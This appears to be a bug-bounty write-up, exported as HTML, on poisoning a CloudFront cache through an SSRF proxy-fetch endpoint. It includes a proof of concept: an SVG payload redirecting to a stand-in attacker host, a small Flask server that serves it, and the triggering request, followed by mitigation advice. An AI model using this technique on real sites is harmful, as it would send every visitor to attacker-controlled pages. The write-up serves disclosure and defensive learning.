@@ -1,0 +1,156 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome file</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1 id="ssrf‑induced-cache-poisoning-logic-bug">SSRF‑Induced Cache Poisoning Logic Bug</h1>
+<p>In this write‑up, I’ll share a novel <strong>cache poisoning variant</strong> discovered during a BugCrowd engagement. This flaw stems from a mis‑designed proxy‑fetch feature and allows attacker‑controlled content to be cached by CloudFront. Let’s dive in.</p>
+<hr>
+<h2 id="vendor-feedback">1. Vendor Feedback</h2>
+<p>The bug originates from an exposed <strong>Proxy Controller Endpoint</strong>, which I initially reported as SSRF (P5 Informational). The program considered SSRF—fetching external or attacker‑controlled URLs—as low impact. They recommended elevating the impact before re‑assessment.</p>
+<p><img src="https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/2.png" alt="Vendor Feedback"></p>
+<hr>
+<h2 id="discovery-of-cache-poisoning">2. Discovery of Cache Poisoning</h2>
+<p>While testing SSRF, a colleague noticed the target would only fetch responses with <strong>Content-Type: image/svg+xml</strong>. Using <code>text/html</code> resulted in <strong>400 Bad Request</strong>. Switching to <code>image/svg+xml</code> returned <strong>200 OK</strong>, confirming SSRF worked.</p>
+<ul>
+<li><strong>text/html</strong> ⇒ 400</li>
+</ul>
+<p><img src="https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/4.jpg" alt="text/html 400"></p>
+<ul>
+<li><strong>image/svg+xml</strong> ⇒ 200</li>
+</ul>
+<p><img src="https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/3.jpg" alt="image/svg+xml 200"></p>
+<p>Uniquely, CloudFront <strong>cached</strong> this attacker‑controlled SVG response—unexpected in typical cache poisoning scenarios.</p>
+<blockquote>
+<p><em>Note: I used <a href="https://requestrepo.com/#/requests">RequestRepo</a> to simulate various response headers.</em></p>
+</blockquote>
+<p><img src="https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/5.png" alt="Header Testing"></p>
+<hr>
+<h2 id="proof‑of‑concept">3. Proof‑of‑Concept</h2>
+<h3 id="svg-payload-poc.xml">3.1 SVG Payload (<code>poc.xml</code>)</h3>
+<pre class=" language-xml"><code class="prism  language-xml">
+<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span>  <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foreignObject</span>  <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span>  <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span>  <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/xhtml<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span>  <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span>  <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0; url=https://attacker.example.com/<span class="token punctuation">"</span></span>  <span class="token punctuation">/&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foreignObject</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span>
+
+</code></pre>
+<h3 id="attacker-server-python-flask">3.2 Attacker Server (Python Flask)</h3>
+<pre class=" language-python"><code class="prism  language-python">
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response
+
+<span class="token keyword">import</span> os
+
+  
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+  
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/poc.xml'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span>  <span class="token function">serve_payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+<span class="token keyword">with</span>  <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'poc.xml'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+
+resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+resp<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'image/svg+xml'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">return</span> resp
+
+  
+
+<span class="token keyword">if</span>  __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+
+app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5505</span><span class="token punctuation">)</span>
+
+</code></pre>
+<p><img src="https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/6.png" alt="Flask Demo"></p>
+<h3 id="ssrf-endpoint-request">3.3 SSRF Endpoint Request</h3>
+<pre class=" language-http"><code class="prism  language-http">
+GET /media?u=http://vps:5505/poc.xml HTTP/1.1
+
+<span class="token header-name keyword">Host:</span> vuln.example.com
+
+</code></pre>
+<p>CloudFront response headers:</p>
+<pre><code>
+X-Cache: Hit from cloudfront
+
+Age: 5
+
+</code></pre>
+<p><img src="https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/7.jpg" alt="CloudFront Hit"></p>
+<hr>
+<h2 id="logs-analysis">4. Logs Analysis</h2>
+<p>Despite sending <strong>30 requests</strong>, <strong>Server Vuln</strong> was only invoked <strong>twice</strong>:</p>
+<ol>
+<li>
+<p><strong>1st &amp; 2nd</strong> fetch: CloudFront had no cache, so it forwarded to <strong>Server Attacker</strong>.</p>
+</li>
+<li>
+<p><strong>3rd onward</strong>: CloudFront served from cache, no new fetches logged.</p>
+</li>
+</ol>
+<p>This behavior confirms <strong>cache poisoning</strong>: attacker content “froze” in CDN and was served to all subsequent users.</p>
+<hr>
+<h2 id="normal-vs.-attack-flow">5. Normal vs. Attack Flow</h2>
+<h3 id="normal-request-flow">Normal Request Flow</h3>
+<p><em>Figure: Standard cache lookup without poisoning.</em></p>
+<p><img src="https://mermaid.ink/img/pako:eNp1kUGPmzAQhf-KNVVubBSTNA4cVkpAiVShqsput1JhD06YgLVgU8dUySL-e41JVu2hPtnve29mNO7gqHKEECaTTkhhQtKRDEyJNWYQ2muOJ95WJgPvrr9wLfihwvNgGNwnJc2TeL8F6LK5jO5B_4GiKM1IDqrKb3XwYiJVKT2CTzN3RlYJif9jmBeY8ANWG358K7RqpS0YWtPJnQxIT_p-MslkoXlTkmSfSULW6Ys4Pov6lTw8PJIv6R5_tXg243OTRvFXElWqzbfaDvw6JDYWWRalT6h_o3Za5Oxx-k2ry5Vs0RxLEnPDHYwd3KZreX0uhSzI931C_gpvHd-lOzRkj-dGyTOSyLbDW8fdOMy9-SNJ0rvP8cSJa_Cg0CKH8MSrM3pQo6758IZucP37c1y_ZZDJ3oYaLn8qVUNodGtjdnNF-VGkbXJuMBbcLq3-UDXKHHVkd2wg9BmduSoQdnCBkPp0Op8zyqjvL6nPmO_BFcL54vM0WARsxth8RVd00Xvw7vrOpis_YAHzlyygA1v0fwBb2MBB" alt="alt text"></p>
+<h3 id="attack-flow-overview">Attack Flow Overview</h3>
+<p><em>Figure: Poisoning CloudFront via SSRF proxy.</em></p>
+<p><img src="https://mermaid.ink/img/pako:eNp1UV1vmzAU_SuWp7zRKCngBB4mJbBG3bppaqdUGvTBgRuwamxmzJQW8d9nmyZaJ81PvufLR74DLmQJOMaz2cAE0zEaUI51DQ3kODbXEo605zrH3hnfU8XogUNnBVZ9lEI_sNc3w5K0p0lt8UdgVa0n5iB5-ZYDJ51ILtVEfFi4M3GcCfgfB2UFd_QAfEuL50rJXpjA2IiO7uQYjWgcZ7NcVIq2Nbq7zwVCm2zPih-seUJXVx_R5-wefvXQaTuaeZsl6TeUcNmXN8o0frKWT9kDqN-g0EZr8xSoyfsl-0o5K5jsO_RXigmxpq27JmfrvufChSUOT7PvSp5e0A3ookYp1dSRqSN32Q60iexaKTpAiekBQqNLiamD1e-c_jY7ax14-2-JDfZwpViJ4yPlHXi4AdVQO-PBqt6vmKrnHOdiNKaWip9SNjjWqjc288VVfQnp25JqSBk1v9tcUAWiBJWYZWgcX69WkUvB8YBPdp5Hy3ARrYOAhKG_WK09_IJjn5B5QPx16C8DEq3IevTwq3t3MY_IdWg2HoU-WQX-kox_AMnmzwg" alt="alt text"></p>
+<hr>
+<h2 id="why-“logic-bug-flaw”">6. Why “Logic Bug Flaw”?</h2>
+<ul>
+<li>
+<p><strong>Standard Cache Poisoning</strong>: Misconfigured headers (<code>Host</code>, <code>X-Forwarded-*</code>) or faulty <code>Cache-Control</code>.</p>
+</li>
+<li>
+<p><strong>Logic Bug Flaw</strong>: Legitimate <strong>proxy‑fetch feature</strong> allows arbitrary URLs. Developers didn’t foresee <strong>Fetch → Cache → Serve</strong> logic enabling attacker content to be cached by CDN.</p>
+</li>
+</ul>
+<blockquote>
+<p><strong>Summary</strong>: This is a <strong>business logic</strong> vulnerability—abuse of a valid feature—rather than mere header or cache misconfiguration.</p>
+</blockquote>
+<hr>
+<h2 id="mitigation-recommendations">7. Mitigation Recommendations</h2>
+<ol>
+<li>
+<p><strong>Whitelist</strong> allowed domains for proxy‑fetch.</p>
+</li>
+<li>
+<p><strong>Validate</strong>  <code>Content-Type</code> of fetched responses.</p>
+</li>
+<li>
+<p>Apply <code>Cache-Control: no-store</code> or <code>Vary</code> headers on the SSRF endpoint.</p>
+</li>
+<li>
+<p><strong>Rate‑limit</strong> and monitor proxy‑fetch usage.</p>
+</li>
+</ol>
+<hr>
+<p><em>End of write‑up.</em></p>
+</div>
+</body>
+
+</html>
